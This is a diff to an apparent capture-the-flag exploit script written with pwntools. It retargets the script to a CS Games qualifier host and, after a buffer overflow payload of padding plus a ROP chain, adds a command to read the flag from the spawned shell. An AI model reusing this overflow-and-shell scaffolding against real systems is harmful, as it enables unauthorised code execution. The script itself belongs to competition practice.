@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 from pwn import *
 
-host = "67.205.174.218"
+host = "csgames-quals.frigon.app"
 port = 8002
 binary_path = "./are_u_done"
 lib_path = None
@@ -61,6 +61,8 @@ payload += "A" * 40
 payload += rop
 
 p.sendlineafter("Understood?\n", payload)
+
+p.sendline("cat flag")
 
 p.interactive()
 
